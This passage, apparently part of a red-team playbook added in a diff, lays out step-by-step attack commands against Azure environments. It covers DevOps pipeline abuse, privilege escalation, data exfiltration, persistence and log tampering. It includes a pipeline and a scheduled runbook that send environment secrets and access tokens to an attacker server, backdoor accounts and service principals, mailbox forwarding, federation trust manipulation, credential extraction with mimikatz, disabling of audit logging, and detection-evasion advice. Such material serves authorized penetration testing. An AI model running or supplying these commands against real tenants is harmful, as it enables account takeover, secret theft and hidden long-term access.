+**Steps/Commands:**
+```bash
+# Install Azure DevOps extension
+az extension add --name azure-devops
+
+# Configure defaults
+az devops configure --defaults organization=https://dev.azure.com/<ORG>
+
+# List projects
+az devops project list
+
+# List repositories
+az repos list --project <PROJECT>
+
+# Clone repository
+git clone https://dev.azure.com/<ORG>/<PROJECT>/_git/<REPO>
+
+# With PAT token
+git clone https://<PAT>@dev.azure.com/<ORG>/<PROJECT>/_git/<REPO>
+
+# List pipelines
+az pipelines list --project <PROJECT>
+
+# Show pipeline details (may contain secrets)
+az pipelines show --id <PIPELINE_ID> --project <PROJECT>
+
+# Get pipeline YAML (contains build steps)
+az pipelines runs show --id <RUN_ID> --project <PROJECT>
+
+# Variable groups (contain secrets)
+az pipelines variable-group list --project <PROJECT>
+az pipelines variable-group show --id <GROUP_ID> --project <PROJECT>
+
+# Get variables
+az pipelines variable-group variable list --group-id <GROUP_ID> --project <PROJECT>
+
+# Create malicious pipeline
+cat > malicious-pipeline.yml << 'EOF'
+trigger:
+  branches:
+    include:
+    - main
+
+pool:
+  vmImage: 'ubuntu-latest'
+
+steps:
+- script: |
+    curl -X POST https://<ATTACKER_SERVER>/data \
+      -H "Content-Type: application/json" \
+      -d "{\"env\": \"$(env | base64)\", \"secrets\": \"$(set | base64)\"}"
+  displayName: 'Exfiltrate'
+  
+- script: |
+    echo $(System.AccessToken) | base64
+    echo $(System.CollectionUri)
+  displayName: 'Get Tokens'
+EOF
+
+# Create pipeline
+az pipelines create \
+    --name "Security-Test" \
+    --repository <REPO> \
+    --branch main \
+    --project <PROJECT> \
+    --yaml-path malicious-pipeline.yml
+
+# Service connections (may have service principal creds)
+az devops service-endpoint list --project <PROJECT>
+az devops service-endpoint show --id <ENDPOINT_ID> --project <PROJECT>
+
+# Get service connection details
+curl -u :<PAT> "https://dev.azure.com/<ORG>/<PROJECT>/_apis/serviceendpoint/endpoints?api-version=6.0-preview.4"
+
+# Artifacts and packages
+az artifacts universal package list --project <PROJECT>
+
+# Download artifact
+az artifacts universal download \
+    --organization https://dev.azure.com/<ORG> \
+    --project <PROJECT> \
+    --scope project \
+    --feed <FEED> \
+    --name <PACKAGE> \
+    --version <VERSION> \
+    --path ./download
+
+# Wiki exploitation (may contain documentation with creds)
+az devops wiki list --project <PROJECT>
+az devops wiki page show --wiki <WIKI> --path <PAGE_PATH> --project <PROJECT>
+
+# Work items (may contain sensitive info)
+az boards query --wiql "SELECT [System.Title] FROM WorkItems WHERE [System.AssignedTo] = @Me"
+
+# Agent pools exploitation
+az pipelines agent list --pool-id <POOL_ID>
+
+# Self-hosted agent exploitation
+# If you compromise a self-hosted agent
+# Access agent working directory
+ls -la _work/
+cat _work/_temp/*
+
+# Extract secrets from agent
+cat .credentials
+cat .agent
+cat _diag/*.log | grep -i password
+
+# Release pipelines
+curl -u :<PAT> "https://vsrm.dev.azure.com/<ORG>/<PROJECT>/_apis/release/definitions?api-version=6.0"
+
+# Approvals bypass
+# Find pending approvals
+curl -u :<PAT> "https://vsrm.dev.azure.com/<ORG>/<PROJECT>/_apis/release/approvals?api-version=6.0"
+
+# Approve release
+curl -X PATCH -u :<PAT> \
+    "https://vsrm.dev.azure.com/<ORG>/<PROJECT>/_apis/release/approvals/<APPROVAL_ID>?api-version=6.0" \
+    -H "Content-Type: application/json" \
+    -d '{"status": "approved", "comments": "Approved"}'
+
+# Secure files
+curl -u :<PAT> "https://dev.azure.com/<ORG>/<PROJECT>/_apis/distributedtask/securefiles?api-version=6.0-preview.1"
+
+# Download secure file
+curl -u :<PAT> "https://dev.azure.com/<ORG>/<PROJECT>/_apis/distributedtask/securefiles/<FILE_ID>?api-version=6.0-preview.1" -o secure_file
+```
+
+**Pitfalls:**
+- Branch policies
+- Required reviewers
+- Pipeline approval gates
+- Audit logging
+- IP restrictions on agents
+
+**Cleanup Steps:**
+```bash
+# Delete malicious pipeline
+az pipelines delete --id <PIPELINE_ID> --project <PROJECT>
+# Remove commits
+git reset --hard HEAD~1
+git push --force
+```
+
+**Suggested Findings:**
+- Service connection secrets
+- Variable group exposure
+- Self-hosted agent compromise
+- Missing branch protection
+- Pipeline injection possible
+
+**Conditions When to Try:**
+- Azure DevOps access
+- PAT token obtained
+- Pipeline permissions
+- Code repository access
+
+---
+
+## 9. Privilege Escalation in Azure
+
+**Category:** Privilege Escalation  
+**Description:** Escalate privileges within Azure environment.
+
+**Tools Required:**
+- Azure CLI
+- Azure PowerShell
+- ROADtools
+- PowerZure
+
+**Steps/Commands:**
+```bash
+# Check current permissions
+az role assignment list --assignee <USER_PRINCIPAL_NAME>
+az role definition list --custom-role-only
+
+# Find roles with dangerous permissions
+# Look for:
+# - Microsoft.Authorization/roleAssignments/write
+# - Microsoft.Authorization/roleDefinitions/write
+# - Microsoft.Compute/virtualMachines/runCommand/action
+# - Microsoft.Storage/storageAccounts/listKeys/action
+# - Microsoft.KeyVault/vaults/secrets/read
+
+# User Administrator role abuse
+# Can reset passwords of non-admin users
+az ad user update --id <TARGET_USER> --password <NEW_PASSWORD>
+
+# Application Administrator abuse
+# Can add credentials to service principals
+az ad app credential reset --id <APP_ID>
+az ad sp credential reset --id <SP_ID>
+
+# Groups Administrator abuse
+# Add yourself to privileged groups
+az ad group member add --group <GROUP_ID> --member-id <YOUR_USER_ID>
+
+# Automation Account abuse
+# RunAs account has Contributor role
+az automation account list
+az automation runbook list --automation-account-name <ACCOUNT> --resource-group <RG>
+
+# Create malicious runbook
+az automation runbook create \
+    --automation-account-name <ACCOUNT> \
+    --resource-group <RG> \
+    --name "EscalatePrivs" \
+    --type "PowerShell"
+
+# Dynamic group abuse
+# Modify user attributes to match dynamic group rules
+az ad user update --id <USER_ID> --department "IT"
+
+# Managed Identity abuse
+# Assign managed identity privileged role
+az role assignment create \
+    --role "Contributor" \
+    --assignee <MANAGED_IDENTITY_ID> \
+    --scope /subscriptions/<SUBSCRIPTION_ID>
+
+# Custom role creation
+az role definition create --role-definition '{
+    "Name": "Custom Contributor",
+    "Description": "Can do everything",
+    "Actions": ["*"],
+    "AssignableScopes": ["/subscriptions/<SUBSCRIPTION_ID>"]
+}'
+
+# Service Principal escalation
+# Create new service principal with high privileges
+az ad sp create-for-rbac --name "LegitApp" --role Contributor
+
+# Key Vault access policy manipulation
+az keyvault set-policy \
+    --name <VAULT_NAME> \
+    --object-id <YOUR_OBJECT_ID> \
+    --secret-permissions get list set delete
+
+# PIM (Privileged Identity Management) abuse
+# Activate eligible role
+Add-AzureADDirectoryRoleMember -ObjectId <ROLE_ID> -RefObjectId <YOUR_USER_ID>
+
+# Azure AD Connect abuse
+# If server compromised, extract credentials
+cmd /c "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
+Import-Module ADSync.psm1
+Get-ADSyncADConnectorAccount
+
+# Pass the PRT (Primary Refresh Token)
+# Extract PRT from compromised machine
+mimikatz # privilege::debug
+mimikatz # sekurlsa::cloudap
+
+# Guest to Member elevation
+# If guest user with certain permissions
+az ad user update --id <GUEST_USER_ID> --user-type Member
+
+# Using PowerZure
+Import-Module PowerZure.ps1
+Get-AzureTarget
+Get-AzureTargetResource -ResourceType VirtualMachine
+Invoke-AzureRunCommand -VMName <VM> -ResourceGroup <RG> -Command "whoami"
+
+# Subscription hijacking
+# If you have Owner role
+az role assignment create \
+    --role Owner \
+    --assignee <YOUR_USER_ID> \
+    --scope /subscriptions/<SUBSCRIPTION_ID>
+
+# Cross-tenant access
+# If B2B collaboration configured
+az login --tenant <TARGET_TENANT_ID>
+```
+
+**Pitfalls:**
+- PIM activation alerts
+- Audit log monitoring
+- Conditional Access blocks
+- MFA challenges
+- Azure Policy restrictions
+
+**Cleanup Steps:**
+```bash
+# Remove added role assignments
+az role assignment delete --assignee <USER_ID> --role <ROLE_NAME>
+# Delete created resources
+az ad app delete --id <APP_ID>
+```
+
+**Suggested Findings:**
+- Dangerous role assignments
+- Service principal abuse
+- Dynamic group manipulation
+- PIM misconfiguration
+- Cross-tenant access
+
+**Conditions When to Try:**
+- Limited initial permissions
+- Service principal access
+- Managed identity available
+- Custom roles present
+
+---
+
+## 10. Data Exfiltration and Persistence
+
+**Category:** Post-Exploitation  
+**Description:** Establish persistence and exfiltrate data from Azure environment.
+
+**Tools Required:**
+- Azure CLI
+- AzCopy
+- PowerShell
+- ROADtools
+
+**Steps/Commands:**
+```bash
+# Data Exfiltration Methods
+
+# 1. Storage Account exfiltration
+# Create attacker-controlled storage
+az storage account create \
+    --name <ATTACKER_STORAGE> \
+    --resource-group <RG> \
+    --location <LOCATION>
+
+# Copy data to attacker storage
+azcopy copy \
+    "https://<TARGET_STORAGE>.blob.core.windows.net/<CONTAINER>?<SAS_TOKEN>" \
+    "https://<ATTACKER_STORAGE>.blob.core.windows.net/<CONTAINER>?<ATTACKER_SAS>" \
+    --recursive
+
+# 2. Email exfiltration (Exchange Online)
+Connect-ExchangeOnline -UserPrincipalName <USER>
+New-InboxRule -Name "Forward" -ForwardTo <ATTACKER_EMAIL> -StopProcessingRules $true
+
+# Export mailbox
+New-MailboxExportRequest -Mailbox <USER> -FilePath "\\<SHARE>\export.pst"
+
+# 3. OneDrive/SharePoint exfiltration
+# Sync to local machine
+rclone sync onedrive: ./onedrive_backup
+
+# Share files externally
+$sharing = @{
+    "type" = "view"
+    "scope" = "anonymous"
+}
+New-PnPSharingLink -Identity <FILE_PATH> -ShareType AnonymousAccess
+
+# Persistence Mechanisms
+
+# 1. Service Principal backdoor
+az ad sp create-for-rbac \
+    --name "MicrosoftSupport" \
+    --role Contributor \
+    --scopes /subscriptions/<SUBSCRIPTION_ID>
+
+# Add certificate for authentication
+az ad sp credential reset \
+    --name <SP_NAME> \
+    --cert @cert.pem \
+    --append
+
+# 2. User account backdoor
+az ad user create \
+    --display-name "Service Account" \
+    --user-principal-name svc_account@<DOMAIN>.onmicrosoft.com \
+    --password <COMPLEX_PASSWORD>
+
+az role assignment create \
+    --assignee svc_account@<DOMAIN>.onmicrosoft.com \
+    --role "Global Administrator"
+
+# 3. Automation Account persistence
+# Create runbook that runs periodically
+$runbook = @'
+$token = Get-AzAccessToken
+Invoke-RestMethod -Uri "https://<ATTACKER_SERVER>/token" -Method POST -Body $token
+'@
+
+az automation runbook create \
+    --automation-account-name <ACCOUNT> \
+    --resource-group <RG> \
+    --name "HealthCheck" \
+    --type PowerShell \
+    --content "$runbook"
+
+# Schedule runbook
+az automation schedule create \
+    --automation-account-name <ACCOUNT> \
+    --resource-group <RG> \
+    --name "DailyHealth" \
+    --frequency Day
+
+# 4. Logic App backdoor
+# Create Logic App that triggers on events
+az logic workflow create \
+    --resource-group <RG> \
+    --name "SecurityMonitor" \
+    --definition @logicapp.json
+
+# 5. Function App backdoor
+# Deploy function with timer trigger
+func azure functionapp publish <FUNCTION_APP> --force
+
+# 6. OAuth App persistence
+# Register malicious app
+az ad app create \
+    --display-name "Office365 Backup" \
+    --reply-urls "https://<ATTACKER_DOMAIN>/callback"
+
+# Grant consent
+az ad app permission admin-consent --id <APP_ID>
+
+# 7. Conditional Access exclusion
+# Exclude backdoor account from policies
+$conditions = New-Object -TypeName Microsoft.Open.MSGraph.Model.ConditionalAccessConditionSet
+$conditions.Users.ExcludeUsers = @('<BACKDOOR_USER_ID>')
+
+# 8. Federation trust manipulation
+# Add attacker-controlled IdP
+Set-MsolDomainAuthentication \
+    -DomainName <DOMAIN> \
+    -FederationBrandName <BRAND> \
+    -Authentication Federated \
+    -IssuerUri <ATTACKER_IDP>
+
+# 9. Azure Key Vault backdoor
+# Add access policy for backdoor account
+az keyvault set-policy \
+    --name <VAULT> \
+    --object-id <BACKDOOR_ID> \
+    --secret-permissions all \
+    --key-permissions all
+
+# 10. Device registration persistence
+# Register attacker device
+Add-AzureADDevice \
+    -DisplayName "TrustedDevice" \
+    -DeviceId <DEVICE_ID> \
+    -DeviceTrustType "AzureAD"
+
+# Covering Tracks
+
+# Disable audit logging (requires high privileges)
+Set-AdminAuditLogConfig -AdminAuditLogEnabled $false
+
+# Clear Azure Activity logs
+# Not directly possible, but can flood with benign events
+
+# Clear command history
+Clear-History
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+# Delete specific audit events (if possible)
+Search-UnifiedAuditLog -StartDate <DATE> -EndDate <DATE> -Operations <OPERATION>
+# Note: Cannot delete, only export/review
+
+# Modify retention policies
+Set-RetentionCompliancePolicy -Identity <POLICY> -RetentionDuration 1
+```
+
+**Pitfalls:**
+- Data loss prevention policies
+- Audit log alerts
+- Large data transfer detection
+- Conditional Access policies
+- Azure Sentinel detection
+
+**Cleanup Steps:**
+```bash
+# Remove persistence mechanisms
+az ad sp delete --id <SP_ID>
+az ad user delete --id <USER_ID>
+az ad app delete --id <APP_ID>
+```
+
+**Suggested Findings:**
+- Weak monitoring
+- No DLP policies
+- Service principal proliferation
+- Excessive guest access
+- Missing MFA enforcement
+
+**Conditions When to Try:**
+- Administrative access gained
+- Long-term access needed
+- Data exfiltration required
+- Persistence for red team
+
+---
+
+## Quick Reference - Azure Enumeration Commands
+
+| Resource | Command | Description |
+|----------|---------|-------------|
+| Tenant Info | `az account show` | Current subscription details |
+| Users | `az ad user list` | List all users |
+| Groups | `az ad group list` | List all groups |
+| Apps | `az ad app list` | List applications |
+| VMs | `az vm list` | List virtual machines |
+| Storage | `az storage account list` | List storage accounts |
+| Key Vaults | `az keyvault list` | List key vaults |
+| SQL | `az sql server list` | List SQL servers |
+| Web Apps | `az webapp list` | List web applications |
+| Network | `az network vnet list` | List virtual networks |
+
+---
+
+## Azure Kill Chain
+
+1. **Reconnaissance** → Find tenant ID, enumerate services
+2. **Initial Access** → Password spray, token theft, consent phishing  
+3. **Discovery** → Enumerate resources, permissions, users
+4. **Privilege Escalation** → Abuse roles, service principals
+5. **Credential Access** → Key Vaults, storage, automation
+6. **Lateral Movement** → VMs, managed identities, DevOps
+7. **Collection** → Storage accounts, databases, emails
+8. **Exfiltration** → AzCopy, external shares, APIs
+9. **Impact** → Resource deletion, ransomware, defacement
+10. **Persistence** → Service principals, OAuth apps, automation
+
+---
+
+## Final Notes
+
+### Critical Azure Weaknesses to Look For
+- Public storage containers
+- Overly permissive role assignments  
+- Service principals with high privileges
+- Unprotected Key Vaults
+- Legacy authentication enabled
+- Missing MFA enforcement
+- Weak conditional access policies
+- Exposed automation accounts
+- DevOps pipeline misconfigurations
+- Managed identity abuse
+
+### Detection Evasion
+- Use legitimate Azure tools
+- Operate during business hours
+- Mimic normal admin behavior  
+- Use service principals over users
+- Leverage managed identities
+- Stay within rate limits
+- Avoid mass operations
+
+### High-Value Targets
+- Key Vaults (credentials)
+- Storage Accounts (data)
+- Automation Accounts (persistence)
+- DevOps (source code, CI/CD)
+- Exchange Online (emails)
+- Azure AD Connect servers
+- Subscription Owners
+- Global Administrators
+
+### Useful Azure Penetration Testing Tools
+- **ROADtools** - Azure AD enumeration
+- **PowerZure** - PowerShell exploitation
+- **MicroBurst** - Azure security assessment  
+- **ScoutSuite** - Multi-cloud auditing
+- **AADInternals** - Azure AD toolkit
+- **TokenTactics** - Token manipulation
+- **MFASweep** - MFA bypass testing
+- **Stormspotter** - Azure graph visualization
+
+Remember: Always ensure you have proper authorization before testing Azure environments. Azure logs extensively, so operate carefully and within scope!
